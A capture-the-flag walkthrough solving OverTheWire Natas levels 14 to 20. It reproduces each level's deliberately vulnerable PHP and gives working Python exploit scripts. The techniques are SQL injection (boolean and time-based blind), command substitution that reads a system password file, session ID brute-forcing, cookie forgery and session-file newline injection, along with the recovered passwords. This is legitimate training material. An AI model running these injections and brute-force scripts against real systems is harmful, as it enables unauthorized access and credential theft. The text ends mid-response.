<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "<censored>" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Try `natas15" --` and no password:

Error:

> Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in /var/www/natas/natas14/index.php on line 24

Looking better at the code, we need to comment out the PHP code, not the SQL query: try `natas15" #`.
This works:

> Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

## Natas 15

### Credentials

Username: natas15
Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
URL: http://natas15.natas.labs.overthewire.org

### Message

Username: ...

Check existence

### Solution

Source code (link):

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas15", "pass": "<censored>" };</script></head>
<body>
<h1>natas15</h1>
<div id="content">
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Try to brute-force the password using the following Python script:

```python
import requests
import string

url = "http://natas15.natas.labs.overthewire.org"
natas15_username = "natas15"
natas15_password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"

success_phrase = "This user exists."

characters = "".join([string.ascii_letters, string.digits])


def find_password_letters():
    letters = []
    print("Finding password letters...")
    for c in characters:
        uri = url + '?username=natas16"+and+password+LIKE+BINARY+"%' + c + '%&debug'
        r = requests.get(uri, auth=(natas15_username, natas15_password))
        if success_phrase in r.text:
            letters.append(c)
    print("All password letters found!")
    return letters


def brute_force_password(password_letters):
    print("Brute-forcing password...")
    password = ""
    for _ in range(1, 64):
        for c in password_letters:
            test = password + c
            uri = url + '?username=natas16"+and+password+LIKE+BINARY+"' + test + '%&debug'
            resp = requests.get(uri, auth=(natas15_username, natas15_password))
            if success_phrase in resp.text:
                password += c
    print("Brute-forcing password complete!")
    return password


if __name__ == "__main__":
    letters = find_password_letters()
    password = brute_force_password(letters)
    print("Password: ", password)
```

Execution:

```shell
$ python natas15.py
Finding password letters...
All password letters found!
Brute-forcing password...
Brute-forcing password complete!
Password:  hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```

## Natas 16

### Credentials

Username: natas16
Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
URL: http://natas16.natas.labs.overthewire.org

### Message

For security reasons, we now filter even more on certain characters

Find words containing: ... **Search**

Output: ...

### Solution

Source code (link):

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas16", "pass": "<censored>" };</script></head>
<body>
<h1>natas16</h1>
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Try to brute-force as before:

```python
import requests
import string

letters = "".join([string.ascii_letters, string.digits])
url = "http://natas16.natas.labs.overthewire.org"
natas16_username = "natas16"
natas16_password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"


def brute_force_password():
    password = ""
    while len(password) < 32:
        for c in letters:
            test = '$(grep -E ^' + password + c + \
                '.* /etc/natas_webpass/natas17)'
            uri = url + '?needle=' + test + '&submit=Search'
            resp = requests.get(uri, auth=(natas16_username, natas16_password))
            if len(resp.text) == 1105:
                password += c
                break
    return password


if __name__ == "__main__":
    password = brute_force_password()
    print(password)
```

Execution:

```bash
$ python natas16.py
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

## Natas 17

### Credentials

Username: natas17
Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
URL: http://natas17.natas.labs.overthewire.org

### Message

Requires a username in an input field.

### Solution

The source code (linked):

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas17", "pass": "<censored>" };</script></head>
<body>
<h1>natas17</h1>
<div id="content">
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Use a Python script:

```python
import requests
import string

url = "http://natas17.natas.labs.overthewire.org/index.php?debug"
natas17_username = "natas17"
natas17_password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

chars = string.digits + string.ascii_letters


def find_letter(letter: str, password: str) -> str:
    body = f"username=natas18\" and password like binary '{password + letter}%' and sleep(5) #"
    resp = requests.post(url, auth=(
        natas17_username, natas17_password), headers=headers, data=body)
    if resp.elapsed.total_seconds() > 3:
        return letter
    return None


def find_password() -> str:
    password = ""
    while len(password) < 32:
        for letter in chars:
            next_letter = find_letter(letter, password)
            if next_letter is not None:
                password += letter
    return password


if __name__ == "__main__":
    password = find_password()
    print(f"Found password: {password}")
```

This gives:

```bash
$ python natas17.py
Found password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```

## Natas 18

### Credentials

Username: natas18
Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
URL: http://natas18.natas.labs.overthewire.org

### Message

Requires the admin credentials: username and password.

### Solution

Source code provided:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "<censored>" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() {
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}

function isValidID($id) {
    return is_numeric($id);
}

function createID($user) {
    global $maxid;
    return rand(1, $maxid);
}

function debug($msg) {
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function my_session_start() {
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}


$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The PHP part only:

```php
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() {
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}

function isValidID($id) {
    return is_numeric($id);
}

function createID($user) {
    global $maxid;
    return rand(1, $maxid);
}

function debug($msg) {
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function my_session_start() {
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}


$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
```

Python script:

```python
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')

count = 1
max_count = 640

url = "http://natas18.natas.labs.overthewire.org/index.php?debug"


def check_session_id(count: int) -> None:
    cookie = "PHPSESSID=" + str(count)
    headers = {'Cookie': cookie}
    response = requests.get(url, headers=headers,
                            auth=basic_auth, verify=False)

    if "You are logged in as a regular user" not in response.text:
        print(response.text)


if __name__ == '__main__':
    for count in range(max_count + 1):
        check_session_id(count)
```

Result:

```bash
$ python experiment.py
Traceback (most recent call last):
  File "/Users/elia/Source/MyStuff/elman23.github.io/OverTheWire/natas/experiment.py", line 24, in <module>
    check_session_id(count)
  File "/Users/elia/Source/MyStuff/elman23.github.io/OverTheWire/natas/experiment.py", line 13, in check_session_id
    cookie = "PHPSESSID=" + count
TypeError: can only concatenate str (not "int") to str
╭─elia@pearl ~/Source/MyStuff/elman23.github.io/OverTheWire/natas ‹main●›
╰─$ python experiment.py                                                    1 ↵
PHPSESSID=119
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Natas 19

### Credentials

Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
URL: http://natas19.natas.labs.overthewire.org

### Message

This page uses mostly the same code as the previous level, but session IDs are no longer sequential...

Please login with your admin account to retrieve credentials for natas20.

The website then requests a username and a password.

### Solution

We explore the request sending obviously wrong credentials:

```python
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')


url = "http://natas19.natas.labs.overthewire.org/index.php"


def check_session_id(session_id: str) -> str:
    cookie = "PHPSESSID=" + session_id
    headers = {'Content-Type': 'text/html; charset=UTF-8',
               'Cookie': cookie}
    body = {"username": "asd", "password": "asd"}
    response = requests.post(url, headers=headers,
                             auth=basic_auth, json=body, verify=False)
    return response.text


if __name__ == '__main__':
    text = check_session_id("3338302d617364")
    print(text)
```

Which gives us:

```bash
$ python natas19.py
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.</div>
</body>
</html>
```

The value of the cookie, `3338302d617364`, is copied from the same request sent through the browser.

We use CyberChef to decode the cookie: `3338302d617364` is simply hex encoding of `380-asd`.

Encoding and decoding from hexadecimal in Python can be done using `base64`:

```python
>>> import base64
>>> base64.b16encode(b"380-asd").lower()
b'3338302d617364'
```

We write the script:

```python
import base64
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

count = 1
max_count = 640
url = "http://natas19.natas.labs.overthewire.org/index.php"


def encode_cookie(cookie: str) -> str:
    encoded_cookie = base64.b16encode(cookie.encode('ascii')).lower()
    return encoded_cookie.decode('ascii')


def check_session_id(count: int, username: str) -> str:
    to_encode = str(count) + "-" + username
    cookie = "PHPSESSID=" + encode_cookie(to_encode)
    headers = {'Content-Type': 'text/html; charset=UTF-8',
               'Cookie': cookie}
    body = {"username": "asd", "password": "asd"}
    response = requests.post(url, headers=headers,
                             auth=basic_auth, json=body, verify=False)
    return response.text


if __name__ == '__main__':
    for count in range(max_count + 1):
        text = check_session_id(count, "admin")
        if "You are logged in as a regular user." not in text:
            print(text)
            break
```

The execution gives:

```bash
$ python natas19.py
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
</body>
</html>
```

## Natas 20

### Credentials

Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
URL: http://natas20.natas.labs.overthewire.org

### Message

You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.

Requires a name.

### Solution

We are given the source code:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "<censored>" };</script></head>
<body>
<h1>natas20</h1>
<div id="content">
<?php

function debug($msg) {
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}


/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode() ?: "";
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
    return true;
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>

<form action="index.php" method="POST">
Your name: <input name="name" value="<?=$name?>"><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The PHP part:

```php
<?php

function debug($msg) {
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}


/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode() ?: "";
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
    return true;
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>
```

There is a `debug` funciton, which supposedly gives the functionality of debug messages when passed `?debug` in the request.

In fact, calling `http://natas20.natas.labs.overthewire.org/index.php?debug` and passing as name `asd` with the script

```python
import base64
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')

url = "http://natas20.natas.labs.overthewire.org/index.php?debug"


def encode_cookie(cookie: str) -> str:
    encoded_cookie = base64.b16encode(cookie.encode('ascii')).lower()
    return encoded_cookie.decode('ascii')


def send_request() -> str:
    cookie = "PHPSESSID=" + "brafbmkkbb2tmhhrn5m68r36n2"
    headers = {'Content-Type': 'text/html; charset=UTF-8',
               'Cookie': cookie}
    body = {"name": "asd"}
    response = requests.post(url, headers=headers,
                             auth=basic_auth, json=body, verify=False)
    return response.text


if __name__ == '__main__':
    text = send_request()
    print(text)
```

we get the message:

```bash
$ python  natas20.py
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw" };</script></head>
<body>
<h1>natas20</h1>
<div id="content">
DEBUG: MYREAD brafbmkkbb2tmhhrn5m68r36n2<br>DEBUG: Session file doesn't exist<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
<form action="index.php" method="POST">
Your name: <input name="name" value=""><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
DEBUG: MYWRITE brafbmkkbb2tmhhrn5m68r36n2 <br>DEBUG: Saving in /var/lib/php/sessions/mysess_brafbmkkbb2tmhhrn5m68r36n2<br>
```

The functions `myread` and `mywrite` need to be read carefully.

The file is created in a first call, then read in the second. So we shall call the API twice, as in the following script:

```python
import base64
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')

url = "http://natas20.natas.labs.overthewire.org/index.php?debug"


def send_request() -> str:
    cookie = "PHPSESSID=" + "admin"
    headers = {'Content-Type': 'application/x-www-form-urlencoded',
               'Cookie': cookie}
    body = "name=test\nadmin 1"
    response = requests.post(url, headers=headers,
                             auth=basic_auth, data=body, verify=False)
    return response.text


if __name__ == '__main__':
    text = send_request()
    text = send_request()
    print(text)
```

This is equivalent to sending twice (eg. with Burp) the following POST request:

```
POST /index.php?debug HTTP/1.1
Host: natas20.natas.labs.overthewire.org
User-Agent: [UNDISCLOSED]
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://natas20.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyMDpwNW1DdlA3R1MySzZCbXQzZ3FoTTJGYzFBNVQ4TVZ5dw==
Connection: keep-alive
Referer: http://natas20.natas.labs.overthewire.org/index.php
Cookie: PHPSESSID=969hrbu40iem1f32c61essr8ev
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

name=test
admin 1
```

The second call gives the response:

```
HTTP/1.1 200 OK
Date: Sun, 20 Oct 2024 14:04:36 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
